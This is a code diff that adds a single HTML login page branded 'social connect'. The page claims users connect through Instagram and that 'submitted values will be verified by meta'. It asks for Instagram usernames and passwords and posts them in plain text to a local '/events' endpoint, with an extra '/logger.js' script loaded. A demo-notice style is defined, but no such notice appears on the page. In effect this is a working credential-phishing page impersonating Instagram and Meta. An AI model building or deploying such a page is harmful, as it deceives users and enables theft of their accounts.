@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0f172a" />
+  <title>Terminal Login Demo</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --border: #2a3344;
+      --text: #e5e9f0;
+      --muted: #8b93a7;
+      --accent: #34d399;
+      --background: #0f172a;
+      --card: #141d31;
+    }
+
+    body {
+      min-height: 100vh;
+      font-family: "Segoe UI", Arial, Helvetica, sans-serif;
+      background: var(--background);
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 36px 16px;
+    }
+
+    .layout {
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .login-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 34px 32px 26px;
+      text-align: center;
+    }
+
+    .brand {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      margin: 5px 0 6px;
+      color: var(--accent);
+    }
+
+    .brand::before {
+      content: "›_";
+      font-family: monospace;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.5;
+      margin-bottom: 26px;
+    }
+
+    .field {
+      width: 100%;
+      margin-bottom: 10px;
+      position: relative;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      font-size: 12px;
+      margin: 0 0 6px;
+      color: var(--muted);
+    }
+
+    input {
+      width: 100%;
+      height: 42px;
+      padding: 10px 12px;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      background: #0c1424;
+      color: var(--text);
+      font-size: 13px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 2px rgba(52, 211, 153, 0.15);
+    }
+
+    .password-field input {
+      padding-right: 58px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 32px;
+      border: none;
+      background: transparent;
+      font-size: 11px;
+      font-weight: 600;
+      cursor: pointer;
+      color: var(--muted);
+    }
+
+    .login-button {
+      width: 100%;
+      min-height: 40px;
+      margin-top: 14px;
+      border: none;
+      border-radius: 6px;
+      background: var(--accent);
+      color: #06281c;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.2s;
+    }
+
+    .login-button:hover {
+      background: #2bb989;
+    }
+
+    .login-button:active {
+      transform: scale(0.98);
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin: 22px 0 16px;
+      color: var(--muted);
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    .demo-notice {
+      padding: 12px 14px;
+      margin-top: 4px;
+      border: 1px solid #2d3f3a;
+      border-radius: 6px;
+      background: #0f2420;
+      color: #8fd8bc;
+      font-size: 11px;
+      line-height: 1.6;
+      text-align: left;
+    }
+
+    .demo-notice strong {
+      color: #b6ecd6;
+    }
+
+    .status {
+      display: none;
+      margin-top: 12px;
+      font-size: 12px;
+      line-height: 1.5;
+      color: var(--accent);
+    }
+  </style>
+</head>
+
+<body>
+  <main>
+    <div class="layout">
+      <section class="login-card" aria-labelledby="brand">
+        <h1 class="brand" id="brand">social connect</h1>
+
+        <p class="subtitle">
+          through instagram connect with your friends.<br />
+          submitted values will be verified by meta.
+        </p>
+
+        <form id="demo-form" autocomplete="off">
+          <div class="field">
+            <label for="username">Username</label>
+            <input
+              id="username"
+              name="username"
+              type="text"
+              placeholder="Enter your instagram username"
+              maxlength="100"
+              autocomplete="off"
+              required
+            />
+          </div>
+
+          <div class="field password-field">
+            <label for="password">Password</label>
+            <input
+              id="password"
+              name="password"
+              type="password"
+              placeholder="Enter your instagram password"
+              maxlength="100"
+              autocomplete="off"
+              required
+            />
+            <button type="button" class="toggle-password" id="toggle-password">SHOW</button>
+          </div>
+
+          <button class="login-button" type="submit">
+            login
+          </button>
+        </form>
+
+        <div class="divider">login to connect with friends</div>
+        <p class="status" id="status" role="status" aria-live="polite"></p>
+      </section>
+    </div>
+  </main>
+
+  <script>
+    const form = document.getElementById("demo-form");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+    const status = document.getElementById("status");
+    const toggleBtn = document.getElementById("toggle-password");
+
+    toggleBtn.addEventListener("click", () => {
+      const isPassword = passwordInput.type === "password";
+      passwordInput.type = isPassword ? "text" : "password";
+      toggleBtn.textContent = isPassword ? "HIDE" : "SHOW";
+    });
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (!username || !password) {
+        status.style.display = "block";
+        status.textContent = "Please fill in both fields first.";
+        return;
+      }
+
+      try {
+        const response = await fetch("/events", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            event: "DEMO_LOGIN_SUBMITTED",
+            username,
+            password
+          })
+        });
+        if (!response.ok) throw new Error("The local server rejected the request.");
+        status.style.display = "block";
+        status.textContent = "send to the local terminal.";
+        form.reset();
+        usernameInput.focus();
+      } catch (error) {
+        status.style.display = "block";
+        status.textContent = "Could not reach the local terminal. Make sure your local server is running.";
+      }
+    });
+  </script>
+  <script src="/logger.js"></script>
+</body>
+</html>
